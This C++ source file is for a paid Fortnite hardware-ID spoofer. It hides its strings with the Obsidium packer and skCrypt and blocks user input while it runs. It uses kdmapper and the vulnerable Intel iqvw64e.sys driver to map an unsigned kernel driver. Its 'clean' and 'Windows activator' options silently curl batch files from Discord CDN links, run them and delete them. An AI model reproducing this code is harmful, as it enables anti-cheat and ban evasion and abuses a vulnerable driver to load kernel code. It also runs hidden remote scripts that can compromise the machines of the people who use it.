#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <urlmon.h>
#include <string>
#include <thread>
#include <vector>
#include "../Obsidium Sdk/obsidium64.h"
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib, "wininet.lib")
#include "bytes.h"

//#include "auth.hpp"
#include <string>

#include "skStr.h"
#include "../kdmaper/intel_driver.hpp"
#include "../kdmaper/kdmapper.hpp"



using namespace std;
std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);


std::string RandomString(const size_t length)
{
	std::string r;
	static const char bet[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYabcdefghijklmnopqrstuvwxyzZ1234567890" };
	srand((unsigned)time(NULL) * 5);
	for (int i = 0; i < length; ++i)
		r += bet[rand() % (sizeof(bet) - 1)];
	return r;
}


void title()
{
	SetConsoleTitleA("Leave A Vouch <3");
}


void ascii()
{
	std::cout << (R"(        
                                                                           
                                                                    )");
}



struct slowly_printing_string {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowly_printing_string& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}




void beep()
{
	Beep(200, 1500);
	Sleep(800);
	Beep(200, 1500);
	Sleep(800);
}

int main()
{
	SetConsoleTitleA("Vertiacl's Paid Fortnite Spoofer");
	OBSIDIUM_VM_START;
	OBSIDIUM_ENC_START;
	OBSIDIUM_LIC_START;

	system("cls");
	std::string user_response;
	std::string vouchresponse;

menu:
	system("color c");
	ascii();
	std::cout << slowly_printing_string{ "\n\n\n [ 1 ] Spoof\n\n [ 2 ] Clean\n\n [ 3 ] Check Serials\n\n [ 4 ] Activate Windows\n\n",10 };
	std::cout << slowly_printing_string{ "\n\n\n Option -> ",10 };

	std::cin >> user_response;
	if (user_response == "1")
	{
		std::cout << ("\n\n\n      Wait...");
		Sleep(1200);
		std::cout << slowly_printing_string{ "\n\n     Spoofing In Progress",50 };
		beep();
		Sleep(2000);
		system(skCrypt("cls"));
		BlockInput(true);
		HANDLE iqvw64e_device_handle = intel_driver::Load();

		if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
		{
			std::cout << "[-] Couldn't Load Driver iqvw64e.sys" << std::endl;
			return -1;
		}

		if (!kdmapper::MapDriver(iqvw64e_device_handle, rawData))
		{
			std::cout << "[-] Failder To Map Driver" << std::endl;
			intel_driver::Unload(iqvw64e_device_handle);
			return -1;
		}

		intel_driver::Unload(iqvw64e_device_handle);

		Sleep(500);
		Beep(500, 200);
		system(skCrypt("cls"));

		BlockInput(false);
		MessageBeep(MB_OK);
		MessageBoxA(NULL, (skCrypt("Spoofed Successfully")), (skCrypt("Vertical.CC Paid")), MB_OK);
		Sleep(500);
		system(skCrypt("cls"));
		goto menu;
	}

	if (user_response == "2")
	{
		Sleep(150);
		std::cout << ("\n\n\n      Wait...");
		Sleep(700);
		system("cls");
		std::cout << ("\n\n     Running Cleaners");
		Sleep(1000);
		system("cls");
		Beep(200, 200);
		system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1045474498264182805/1045484113391538186/1.bat --output C:\\ProgramData\\clean1.bat >nul 2>&1"));

		system(skCrypt("C:\\ProgramData\\clean1.bat"));
		std::remove(skCrypt("C:\\ProgramData\\clean1.bat"));
		system(skCrypt("cls"));
		system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1045474498264182805/1045484113114710086/2.bat --output C:\\ProgramData\\clean2.bat >nul 2>&1"));
		system(skCrypt("C:\\ProgramData\\clean2.bat"));
		std::remove(skCrypt("C:\\ProgramData\\clean2.bat"));
		system(skCrypt("cls"));
		system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1045474498264182805/1045484113676738641/Deep.bat --output C:\\ProgramData\\clean3.bat >nul 2>&1"));
		system(skCrypt("C:\\ProgramData\\clean3.bat"));

		std::remove(skCrypt("C:\\ProgramData\\clean3.bat"));
		system(skCrypt("cls"));
		system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1045474498264182805/1045484113978736650/DeepTraceFn.bat --output C:\\ProgramData\\clean4.bat >nul 2>&1"));

		system(skCrypt("C:\\ProgramData\\clean4.bat"));

		std::remove(skCrypt("C:\\ProgramData\\clean4.bat"));
		system(skCrypt("cls"));


		MessageBoxA(NULL, (skCrypt("Done With Cleaning Process")), (skCrypt("Vertical.cc")), MB_OK);

		int restartt;
		system(skCrypt("cls"));
		std::cout << skCrypt(" [1] Restart Computer : RECOMENDED\n");
		Sleep(200);
		std::cout << skCrypt(" [2] Back To Menu\n");
		std::cin >> restartt;
		switch (restartt)
		{
		case 1:
			std::cout << skCrypt(" [*] goodbye!\n\n");
			Beep(500, 200);
			system(skCrypt("SHUTDOWN -r -t 10"));
			break;

		case 2:
			system("cls");
			goto menu;
			break;
		}
	}



	if (user_response == "3")
	{
		system("cls");
		Sleep(150);
		system("color 5");
		Sleep(200);
		system(skCrypt("echo BaseBoard SN:"));
		Sleep(200);
		system(skCrypt("wmic baseboard get serialnumber"));
		Sleep(200);
		system(skCrypt("echo Bios SN:"));
		Sleep(200);
		system(skCrypt("wmic bios get serialnumber"));
		Sleep(200);
		system(skCrypt("echo Cpu SN:"));
		Sleep(200);
		system(skCrypt("wmic cpu get serialnumber"));
		Sleep(200);
		system(skCrypt("echo DiskDrive SN:"));
		Sleep(200);
		system(skCrypt("wmic diskdrive get serialnumber"));
		Sleep(200);
		std::cout << skCrypt("  ") << '\n';
		Sleep(200);
		system(skCrypt("echo -----------------------------------------------"));
		Sleep(200);
		system(skCrypt("echo Going back to Dashboard in 7 Seconds..."));
		Sleep(200);
		system(skCrypt("echo -----------------------------------------------"));
		Sleep(7000);


		system(skCrypt("cls"));
		goto menu;
	}

	if (user_response == "4")
	{
		system("cls");
		Sleep(150);
		std::cout << (skCrypt("\n\n\n      Wait..."));
		Sleep(150);
		std::cout << (skCrypt("\n\n     Activating Windows Activator"));
		Sleep(300);
		system("cls");
		Beep(200, 200);
		system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/995611861770850345/1062482310122971246/windows_activater_2.bat --output C:\\ProgramData\\windows_activater_2.bat >nul 2>&1"));

		system(skCrypt("C:\\ProgramData\\windows_activater_2.bat"));
		system(skCrypt("cls"));

		std::remove(skCrypt("C:\\ProgramData\\windows_activater_2.bat"));


		system(skCrypt("cls"));
		goto menu;
	}






}

std::string tm_to_readable_time(tm ctx) {
    char buffer[80];

    strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

    return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
    auto cv = strtol(timestamp.c_str(), NULL, 10); // long

    return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}